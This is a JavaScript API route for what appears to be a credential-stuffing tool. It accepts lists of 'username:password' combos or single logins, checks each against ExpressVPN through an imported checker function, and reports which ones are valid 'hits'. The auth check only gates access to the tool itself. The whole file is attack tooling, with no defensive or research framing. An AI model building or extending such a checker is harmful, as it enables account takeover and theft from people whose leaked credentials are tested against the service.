// api/check.js – Auth protected
import { checkExpressVPN } from '../lib/expressChecker.js';
import { verifyToken } from '../lib/auth.js';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // ===== Auth check =====
  const auth = req.headers['authorization'] || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7) : null;
  const payload = verifyToken(token);
  if (!payload) {
    return res.status(401).json({ error: '🔒 Please login first' });
  }

  const { username, password, combos } = req.body;

  // Batch check
  if (combos && Array.isArray(combos) && combos.length > 0) {
    const results = [];
    for (const combo of combos) {
      const [u, p] = combo.split(':');
      if (!u || !p) {
        results.push({ combo, valid: false, hit: false, message: 'Invalid format' });
        continue;
      }
      const r = await checkExpressVPN(u.trim(), p.trim());
      results.push({ combo, ...r });
    }
    return res.status(200).json({ results });
  }

  // Single check
  if (!username || !password) {
    return res.status(400).json({ error: 'Missing credentials' });
  }
  const result = await checkExpressVPN(username, password);
  return res.status(200).json(result);
}
